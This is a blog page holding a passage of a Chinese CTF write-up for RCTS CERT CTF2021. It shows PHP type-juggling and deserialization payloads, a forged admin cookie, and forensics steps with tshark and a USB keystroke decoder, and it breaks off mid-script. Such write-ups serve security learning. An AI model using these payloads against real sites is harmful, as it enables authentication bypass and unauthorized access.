<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="format-detection" content="telephone=no"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black"><link rel="icon" href="/images/icons/atkx_16x16.png?v=2.6.2" type="image/png" sizes="16x16"><link rel="icon" href="/images/icons/atkx-32x32.png?v=2.6.2" type="image/png" sizes="32x32"><meta property="og:type" content="website">
<meta property="og:title" content="At的小站">
<meta property="og:url" content="https://swhat.github.io/index.html">
<meta property="og:site_name" content="At的小站">
<meta property="og:locale" content="zh_CN">
<meta property="article:author" content="Atkx">
<meta name="twitter:card" content="summary"><title>At的小站</title><link ref="canonical" href="https://swhat.github.io/index.html"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.12.1/css/all.min.css" type="text/css"><link rel="stylesheet" href="/css/index.css?v=2.6.2"><script>var Stun = window.Stun || {};
var CONFIG = {
  root: '/',
  algolia: undefined,
  assistSearch: undefined,
  fontIcon: {"prompt":{"success":"fas fa-check-circle","info":"fas fa-arrow-circle-right","warning":"fas fa-exclamation-circle","error":"fas fa-times-circle"},"copyBtn":"fas fa-copy"},
  sidebar: {"offsetTop":"20px","tocMaxDepth":6},
  header: {"enable":true,"showOnPost":true,"scrollDownIcon":false},
  postWidget: {"endText":true},
  nightMode: {"enable":true},
  back2top: {"enable":true},
  codeblock: {"style":"default","highlight":"light","wordWrap":false},
  reward: false,
  fancybox: false,
  zoomImage: {"gapAside":"20px"},
  galleryWaterfall: undefined,
  lazyload: false,
  pjax: undefined,
  externalLink: {"icon":{"enable":true,"name":"fas fa-external-link-alt"}},
  shortcuts: undefined,
  prompt: {"copyButton":"复制","copySuccess":"复制成功","copyError":"复制失败"},
  sourcePath: {"js":"js","css":"css","images":"images"},
};

window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 5.3.0"><link rel="alternate" href="/atom.xml" title="At的小站" type="application/atom+xml">
</head><body><div class="container" id="container"><header class="header" id="header"><div class="header-inner"><nav class="header-nav header-nav--fixed"><div class="header-nav-inner"><div class="header-nav-menubtn"><i class="fas fa-bars"></i></div><div class="header-nav-menu"><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/"><span class="header-nav-menu-item__icon"><i class="fas fa-home"></i></span><span class="header-nav-menu-item__text">首页</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/archives/"><span class="header-nav-menu-item__icon"><i class="fas fa-folder-open"></i></span><span class="header-nav-menu-item__text">归档</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/categories/"><span class="header-nav-menu-item__icon"><i class="fas fa-layer-group"></i></span><span class="header-nav-menu-item__text">分类</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/tags/"><span class="header-nav-menu-item__icon"><i class="fas fa-tags"></i></span><span class="header-nav-menu-item__text">标签</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/links/"><span class="header-nav-menu-item__icon"><i class="fas fas-folder-open"></i></span><span class="header-nav-menu-item__text">menu.links</span></a></div></div><div class="header-nav-search"><span class="header-nav-search__icon"><i class="fas fa-search"></i></span><span class="header-nav-search__text">搜索</span></div><div class="header-nav-mode"><div class="mode"><div class="mode-track"><span class="mode-track-moon"></span><span class="mode-track-sun"></span></div><div class="mode-thumb"></div></div></div></div></nav><div class="header-banner"><div class="header-banner-info"><div class="header-banner-info__title">At的小站</div><div class="header-banner-info__subtitle"></div></div></div></div></header><main class="main" id="main"><div class="main-inner"><div class="content-wrap" id="content-wrap"><div class="content content-home" id="content"><section class="postlist"><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2021/10/24/ISCTF2021/">ISCTF2021</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">发表于</span><span class="post-meta-item__value">2021-10-24</span></span><span class="post-meta-item post-meta-item--wordcount"><span class="post-meta-item__icon"><i class="far fa-file-word"></i></span><span class="post-meta-item__info">字数统计</span><span class="post-meta-item__value">9.5k</span></span></div></header><div class="post-body"><div class="post-excerpt"><p>ISCTF2021</p></div><div class="post-readmore"><a class="post-readmore__link" href="/2021/10/24/ISCTF2021/"><span class="post-readmore__text">阅读全文</span><span class="post-readmore__icon"><i class="fas fa-long-arrow-alt-right"></i></span></a></div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2021/08/13/RCTS-CERT-CTF2021/">RCTS CERT CTF2021</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">发表于</span><span class="post-meta-item__value">2021-08-13</span></span><span class="post-meta-item post-meta-item--wordcount"><span class="post-meta-item__icon"><i class="far fa-file-word"></i></span><span class="post-meta-item__info">字数统计</span><span class="post-meta-item__value">2.6k</span></span></div></header><div class="post-body"><div class="post-excerpt"><a id="more"></a>


<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="Some-type-of-juggling"><a href="#Some-type-of-juggling" class="headerlink" title="Some type of juggling"></a>Some type of juggling</h2><p><strong>#web#php</strong><br>Can you solve this challenge?<br>URL:<a target="_blank" rel="noopener" href="http://challenges.defsoc.tk:8080/">http://challenges.defsoc.tk:8080</a><br>Flag format: flag{string}</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;source&#x27;</span>])) &#123;<br>        highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>        <span class="hljs-keyword">die</span>();<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$value</span> = <span class="hljs-string">&quot;240610708&quot;</span>;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;hash&#x27;</span>])) &#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;hash&#x27;</span>] === <span class="hljs-variable">$value</span>) &#123;<br>                <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;It is not THAT easy!&#x27;</span>);<br>            &#125; <br>            <span class="hljs-variable">$hash</span> = md5(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;hash&#x27;</span>]);<br>            <span class="hljs-variable">$key</span> = md5(<span class="hljs-variable">$value</span>);<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$hash</span> == <span class="hljs-variable">$key</span>) &#123;<br>                <span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br>                <span class="hljs-keyword">print</span> <span class="hljs-string">&quot;Congratulations! Your flag is: <span class="hljs-subst">$flag</span>&quot;</span>;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-keyword">print</span> <span class="hljs-string">&quot;Flag not found!&quot;</span>;<br>            &#125;<br>        &#125; <br>    &#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
<p>md5后的结果要一样，可以用0e绕过，而且hash与value之间的关系是弱等，所以hash不能是数字。var_dump(md5(‘240610708’) == md5(‘QNKCDZO’));<br> 解题</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">?hash=QNKCDZO<br>Congratulations! Your flag is: flag&#123;php_typ3_juggl1ng_1s_c00l&#125;<br></code></pre></td></tr></table></figure>
<h2 id="Exclusive-access"><a href="#Exclusive-access" class="headerlink" title="Exclusive access"></a>Exclusive access</h2><p><strong>#web#owasp10</strong><br>We discovered a protected page. Can you bypass it?<br>URL:<a target="_blank" rel="noopener" href="http://challenges.defsoc.tk:9999/">http://challenges.defsoc.tk:9999</a><br>Flag format: flag{string}</p>
<p> 抓包得到</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">Cookie: user_type=Z3Vlc3Q%<span class="hljs-number">3</span>D<br></code></pre></td></tr></table></figure>
<p>url解码再base64解码得到guest，将admin逆操作得到YWRtaW4%3D，传过去得到flag</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">flag&#123;br0k3n_auth3nt1c4t10n&#125;<br></code></pre></td></tr></table></figure>
<h2 id="It-is-Magic-after-all"><a href="#It-is-Magic-after-all" class="headerlink" title="It is Magic after all"></a>It is Magic after all</h2><p><strong>#web#php</strong><br>Can you do some magic in this page?<br>URL:<a target="_blank" rel="noopener" href="http://challenges.defsoc.tk:3000/">http://challenges.defsoc.tk:3000</a><br>Flag format: flag{string}<br>​</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;flag.php&quot;</span>;  <br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Magic</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$key</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">doMagic</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">$this</span>-&gt;key === <span class="hljs-literal">true</span>) &#123;<br>          <span class="hljs-keyword">global</span> <span class="hljs-variable">$flag</span>;<br>          <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>        &#125;<br>        <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Nothing...&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;magic&#x27;</span>])) &#123;  <br>    <span class="hljs-variable">$magic</span> = unserialize(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;magic&#x27;</span>]); <br>    <span class="hljs-variable">$magic</span>-&gt;doMagic();<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">print</span> <span class="hljs-string">&quot;Nothing...&quot;</span>;<br>&#125;  <br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
<p>exp</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Magic</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$key</span>=<span class="hljs-literal">true</span>;<br>&#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> Magic();<br><span class="hljs-keyword">echo</span> serialize(<span class="hljs-variable">$a</span>);<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
<p>Payload：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">?magic=O:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;Magic&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;key&quot;</span>;b:<span class="hljs-number">1</span>;&#125;<br><span class="hljs-comment">#flag&#123;php_d3s3r14l1z4t10n_3xpl01ts&#125;</span><br></code></pre></td></tr></table></figure>


<h1 id="Forensics"><a href="#Forensics" class="headerlink" title="Forensics"></a>Forensics</h1><h2 id="Hiding-in-plain-sight"><a href="#Hiding-in-plain-sight" class="headerlink" title="Hiding in plain sight"></a>Hiding in plain sight</h2><p><strong>#forensi#images</strong><br>I think there is something fishy about this image.<br>Can you help me out?<br>Flag format: flag{string}<br>​</p>
<p>010文件尾就是flag</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">flag&#123;h1dd3n_t3xt_1n_pl41ns1ght&#125;<br></code></pre></td></tr></table></figure>
<h2 id="Welcome-to-the-challenge"><a href="#Welcome-to-the-challenge" class="headerlink" title="Welcome to the challenge"></a>Welcome to the challenge</h2><p><strong>#forensics#images</strong><br>Welcome to the RCTS Challenge!<br>Can you find the flag?<br>Flag format: flag{string}<br>​</p>
<p>直接foremost分离图片</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">flag&#123;<span class="hljs-number">0</span>n3_1m4g3_1s_n0t_3n0ugh&#125;<br></code></pre></td></tr></table></figure>
<h2 id="About-us"><a href="#About-us" class="headerlink" title="About us"></a>About us</h2><p><strong>#forensics#pdfs</strong><br>This challenge is about the RCTS CERT at FCCN.<br>Can you get the flag?<br>Flag format: flag{string}<br>​</p>
<p>strings查看：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">└─$ strings RCTSCERT-FCCN.pdf |grep flag                                                                                                      139 ⨯<br>  &lt;pdfx:Flag&gt;flag&#123;4b0ut_us_4t_rcts_c3rt&#125;&lt;/pdfx:Flag&gt;<br></code></pre></td></tr></table></figure>
<h2 id="Keyp-it-universal"><a href="#Keyp-it-universal" class="headerlink" title="Keyp it universal"></a>Keyp it universal</h2><p><strong>#foren#pcap</strong><br>We intercepted a strange communication which we believe has important information inside.<br>Can you retrieve the information from it?<br>Flag format: flag{string}<br>Regex: flag{[0-9a-z_]+}<br>​</p>
<p>USB键盘流量</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">tshark -r capture.pcap -T fields -e usb.capdata &gt; usbdata.txt<br><br>tshark -r capture.pcap -T fields -e usb.capdata | sed <span class="hljs-string">&#x27;/^\s*$/d&#x27;</span> &gt; usbdata.txt<br></code></pre></td></tr></table></figure>
<p>加冒号</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php">f=open(<span class="hljs-string">&#x27;usbdata.txt&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>)<br>fi=open(<span class="hljs-string">&#x27;out.txt&#x27;</span>,<span class="hljs-string">&#x27;w&#x27;</span>)<br><span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:<br>    a=f.readline().strip()<br>    <span class="hljs-keyword">if</span> a:<br>        <span class="hljs-keyword">if</span> len(a)==<span class="hljs-number">16</span>: <span class="hljs-comment"># 键盘流量len=16，鼠标流量len=8</span><br>            out=<span class="hljs-string">&#x27;&#x27;</span><br>            <span class="hljs-keyword">for</span> i in range(<span class="hljs-number">0</span>,len(a),<span class="hljs-number">2</span>):<br>                <span class="hljs-keyword">if</span> i+<span class="hljs-number">2</span> != len(a):<br>                    out+=a[i]+a[i+<span class="hljs-number">1</span>]+<span class="hljs-string">&quot;:&quot;</span><br>                <span class="hljs-keyword">else</span>:<br>                    out+=a[i]+a[i+<span class="hljs-number">1</span>]<br>            fi.write(out)<br>            fi.write(<span class="hljs-string">&#x27;\n&#x27;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">break</span><br><br>fi.close()<br><br></code></pre></td></tr></table></figure>

<p>keyborad.py</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><code class="hljs php">normalKeys = &#123;<br>    <span class="hljs-string">&quot;04&quot;</span>:<span class="hljs-string">&quot;a&quot;</span>, <span class="hljs-string">&quot;05&quot;</span>:<span class="hljs-string">&quot;b&quot;</span>, <span class="hljs-string">&quot;06&quot;</span>:<span class="hljs-string">&quot;c&quot;</span>, <span class="hljs-string">&quot;07&quot;</span>:<span class="hljs-string">&quot;d&quot;</span>, <span class="hljs-string">&quot;08&quot;</span>:<span class="hljs-string">&quot;e&quot;</span>,<br>    <span class="hljs-string">&quot;09&quot;</span>:<span class="hljs-string">&quot;f&quot;</span>, <span class="hljs-string">&quot;0a&quot;</span>:<span class="hljs-string">&quot;g&quot;</span>, <span class="hljs-string">&quot;0b&quot;</span>:<span class="hljs-string">&quot;h&quot;</span>, <span class="hljs-string">&quot;0c&quot;</span>:<span class="hljs-string">&quot;i&quot;</span>, <span class="hljs-string">&quot;0d&quot;</span>:<span class="hljs-string">&quot;j&quot;</span>,<br>     <span class="hljs-string">&quot;0e&quot;</span>:<span class="hljs-string">&quot;k&quot;</span>, <span class="hljs-string">&quot;0f&quot;</span>:<span class="hljs-string">&quot;l&quot;</span>, <span class="hljs-string">&quot;10&quot;</span>:<span class="hljs-string">&quot;m&quot;</span>, <span class="hljs-string">&quot;11&quot;</span>:<span class="hljs-string">&quot;n&quot;</span>, <span class="hljs-string">&quot;12&quot;</span>:<span class="hljs-string">&quot;o&quot;</span>,<br>      <span class="hljs-string">&quot;13&quot;</span>:<span class="hljs-string">&quot;p&quot;</span>, <span class="hljs-string">&quot;14&quot;</span>:<span class="hljs-string">&quot;q&quot;</span>, <span class="hljs-string">&quot;15&quot;</span>:<span class="hljs-string">&quot;r&quot;</span>, <span class="hljs-string">&quot;16&quot;</span>:<span class="hljs-string">&quot;s&quot;</span>, <span class="hljs-string">&quot;17&quot;</span>:<span class="hljs-string">&quot;t&quot;</span>,<br>       <span class="hljs-string">&quot;18&quot;</span>:<span class="hljs-string">&quot;u&quot;</span>, <span class="hljs-string">&quot;19&quot;</span>:<span class="hljs-string">&quot;v&quot;</span>, <span class="hljs-string">&quot;1a&quot;</span>:<span class="hljs-string">&quot;w&quot;</span>, <span class="hljs-string">&quot;1b&quot;</span>:<span class="hljs-string">&quot;x&quot;</span>, <span class="hljs-string">&quot;1c&quot;</span>:<span class="hljs-string">&quot;y&quot;</span>,<br>        <span class="hljs-string">&quot;1d&quot;</span>:<span class="hljs-string">&quot;z&quot;</span>,<span class="hljs-string">&quot;1e&quot;</span>:<span class="hljs-string">&quot;1&quot;</span>, <span class="hljs-string">&quot;1f&quot;</span>:<span class="hljs-string">&quot;2&quot;</span>, <span class="hljs-string">&quot;20&quot;</span>:<span class="hljs-string">&quot;3&quot;</span>, <span class="hljs-string">&quot;21&quot;</span>:<span class="hljs-string">&quot;4&quot;</span>,<br>         <span class="hljs-string">&quot;22&quot;</span>:<span class="hljs-string">&quot;5&quot;</span>, <span class="hljs-string">&quot;23&quot;</span>:<span class="hljs-string">&quot;6&quot;</span>,<span class="hljs-string">&quot;24&quot;</span>:<span class="hljs-string">&quot;7&quot;</span>,<span class="hljs-string">&quot;25&quot;</span>:<span class="hljs-string">&quot;8&quot;</span>,<span class="hljs-string">&quot;26&quot;</span>:<span class="hljs-string">&quot;9&quot;</span>,<br>         <span class="hljs-string">&quot;27&quot;</span>:<span class="hljs-string">&quot;0&quot;</span>,<span class="hljs-string">&quot;28&quot;</span>:<span class="hljs-string">&quot;&lt;RET&gt;&quot;</span>,<span class="hljs-string">&quot;29&quot;</span>:<span class="hljs-string">&quot;&lt;ESC&gt;&quot;</span>,<span class="hljs-string">&quot;2a&quot;</span>:<span class="hljs-string">&quot;&lt;DEL&gt;&quot;</span>, <span class="hljs-string">&quot;2b&quot;</span>:<span class="hljs-string">&quot;\t&quot;</span>,<br>         <span class="hljs-string">&quot;2c&quot;</span>:<span class="hljs-string">&quot;&lt;SPACE&gt;&quot;</span>,<span class="hljs-string">&quot;2d&quot;</span>:<span class="hljs-string">&quot;-&quot;</span>,<span class="hljs-string">&quot;2e&quot;</span>:<span class="hljs-string">&quot;=&quot;</span>,<span class="hljs-string">&quot;2f&quot;</span>:<span class="hljs-string">&quot;[&quot;</span>,<span class="hljs-string">&quot;30&quot;</span>:<span class="hljs-string">&quot;]&quot;</span>,<span class="hljs-string">&quot;31&quot;</span>:<span class="hljs-string">&quot;\\&quot;</span>,<br>         <span class="hljs-string">&quot;32&quot;</span>:<span class="hljs-string">&quot;&lt;NON&gt;&quot;</span>,<span class="hljs-string">&quot;33&quot;</span>:<span class="hljs-string">&quot;;&quot;</span>,<span class="hljs-string">&quot;34&quot;</span>:<span class="hljs-string">&quot;&#x27;&quot;</span>,<span class="hljs-string">&quot;35&quot;</span>:<span class="hljs-string">&quot;&lt;GA&gt;&quot;</span>,<span class="hljs-string">&quot;36&quot;</span>:<span class="hljs-string">&quot;,&quot;</span>,<span class="hljs-string">&quot;37&quot;</span>:<span class="hljs-string">&quot;.&quot;</span>,<br>         <span class="hljs-string">&quot;38&quot;</span>:<span class="hljs-string">&quot;/&quot;</span>,<span class="hljs-string">&quot;39&quot;</span>:<span class="hljs-string">&quot;&lt;CAP&gt;&quot;</span>,<span class="hljs-string">&quot;3a&quot;</span>:<span class="hljs-string">&quot;&lt;F1&gt;&quot;</span>,<span class="hljs-string">&quot;3b&quot;</span>:<span class="hljs-string">&quot;&lt;F2&gt;&quot;</span>, <span class="hljs-string">&quot;3c&quot;</span>:<span class="hljs-string">&quot;&lt;F3&gt;&quot;</span>,<span class="hljs-string">&quot;3d&quot;</span>:<span class="hljs-string">&quot;&lt;F4&gt;&quot;</span>,<br>         <span class="hljs-string">&quot;3e&quot;</span>:<span class="hljs-string">&quot;&lt;F5&gt;&quot;</span>,<span class="hljs-string">&quot;3f&quot;</span>:<span class="hljs-string">&quot;&lt;F6&gt;&quot;</span>,<span class="hljs-string">&quot;40&quot;</span>:<span class="hljs-string">&quot;&lt;F7&gt;&quot;</span>,<span class="hljs-string">&quot;41&quot;</span>:<span class="hljs-string">&quot;&lt;F8&gt;&quot;</span>,<span class="hljs-string">&quot;42&quot;</span>:<span class="hljs-string">&quot;&lt;F9&gt;&quot;</span>,<span class="hljs-string">&quot;43&quot;</span>:<span class="hljs-string">&quot;&lt;F10&gt;&quot;</span>,<br>         <span class="hljs-string">&quot;44&quot;</span>:<span class="hljs-string">&quot;&lt;F11&gt;&quot;</span>,<span class="hljs-string">&quot;45&quot;</span>:<span class="hljs-string">&quot;&lt;F12&gt;&quot;</span>&#125;<br>shiftKeys = &#123;<br>    <span class="hljs-string">&quot;04&quot;</span>:<span class="hljs-string">&quot;A&quot;</span>, <span class="hljs-string">&quot;05&quot;</span>:<span class="hljs-string">&quot;B&quot;</span>, <span class="hljs-string">&quot;06&quot;</span>:<span class="hljs-string">&quot;C&quot;</span>, <span class="hljs-string">&quot;07&quot;</span>:<span class="hljs-string">&quot;D&quot;</span>, <span class="hljs-string">&quot;08&quot;</span>:<span class="hljs-string">&quot;E&quot;</span>,<br>     <span class="hljs-string">&quot;09&quot;</span>:<span class="hljs-string">&quot;F&quot;</span>, <span class="hljs-string">&quot;0a&quot;</span>:<span class="hljs-string">&quot;G&quot;</span>, <span class="hljs-string">&quot;0b&quot;</span>:<span class="hljs-string">&quot;H&quot;</span>, <span class="hljs-string">&quot;0c&quot;</span>:<span class="hljs-string">&quot;I&quot;</span>, <span class="hljs-string">&quot;0d&quot;</span>:<span class="hljs-string">&quot;J&quot;</span>,<br>      <span class="hljs-string">&quot;0e&quot;</span>:<span class="hljs-string">&quot;K&quot;</span>, <span class="hljs-string">&quot;0f&quot;</span>:<span class="hljs-string">&quot;L&quot;</span>, <span class="hljs-string">&quot;10&quot;</span>:<span class="hljs-string">&quot;M&quot;</span>, <span class="hljs-string">&quot;11&quot;</span>:<span class="hljs-string">&quot;N&quot;</span>, <span class="hljs-string">&quot;12&quot;</span>:<span class="hljs-string">&quot;O&quot;</span>,<br>       <span class="hljs-string">&quot;13&quot;</span>:<span class="hljs-string">&quot;P&quot;</span>, <span class="hljs-string">&quot;14&quot;</span>:<span class="hljs-string">&quot;Q&quot;</span>, <span class="hljs-string">&quot;15&quot;</span>:<span class="hljs-string">&quot;R&quot;</span>, <span class="hljs-string">&quot;16&quot;</span>:<span class="hljs-string">&quot;S&quot;</span>, <span class="hljs-string">&quot;17&quot;</span>:<span class="hljs-string">&quot;T&quot;</span>,<br>        <span class="hljs-string">&quot;18&quot;</span>:<span class="hljs-string">&quot;U&quot;</span>, <span class="hljs-string">&quot;19&quot;</span>:<span class="hljs-string">&quot;V&quot;</span>, <span class="hljs-string">&quot;1a&quot;</span>:<span class="hljs-string">&quot;W&quot;</span>, <span class="hljs-string">&quot;1b&quot;</span>:<span class="hljs-string">&quot;X&quot;</span>, <span class="hljs-string">&quot;1c&quot;</span>:<span class="hljs-string">&quot;Y&quot;</span>,<br>         <span class="hljs-string">&quot;1d&quot;</span>:<span class="hljs-string">&quot;Z&quot;</span>,<span class="hljs-string">&quot;1e&quot;</span>:<span class="hljs-string">&quot;!&quot;</span>, <span class="hljs-string">&quot;1f&quot;</span>:<span class="hljs-string">&quot;@&quot;</span>, <span class="hljs-string">&quot;20&quot;</span>:<span class="hljs-string">&quot;#&quot;</span>, <span class="hljs-string">&quot;21&quot;</span>:<span class="hljs-string">&quot;$&quot;</span>,<br>          <span class="hljs-string">&quot;22&quot;</span>:<span class="hljs-string">&quot;%&quot;</span>, <span class="hljs-string">&quot;23&quot;</span>:<span class="hljs-string">&quot;^&quot;</span>,<span class="hljs-string">&quot;24&quot;</span>:<span class="hljs-string">&quot;&amp;&quot;</span>,<span class="hljs-string">&quot;25&quot;</span>:<span class="hljs-string">&quot;*&quot;</span>,<span class="hljs-string">&quot;26&quot;</span>:<span class="hljs-string">&quot;(&quot;</span>,<span class="hljs-string">&quot;27&quot;</span>:<span class="hljs-string">&quot;)&quot;</span>,<br>          <span class="hljs-string">&quot;28&quot;</span>:<span class="hljs-string">&quot;&lt;RET&gt;&quot;</span>,<span class="hljs-string">&quot;29&quot;</span>:<span class="hljs-string">&quot;&lt;ESC&gt;&quot;</span>,<span class="hljs-string">&quot;2a&quot;</span>:<span class="hljs-string">&quot;&lt;DEL&gt;&quot;</span>, <span class="hljs-string">&quot;2b&quot;</span>:<span class="hljs-string">&quot;\t&quot;</span>,<span class="hljs-string">&quot;2c&quot;</span>:<span class="hljs-string">&quot;&lt;SPACE&gt;&quot;</span>,<br>          <span class="hljs-string">&quot;2d&quot;</span>:<span 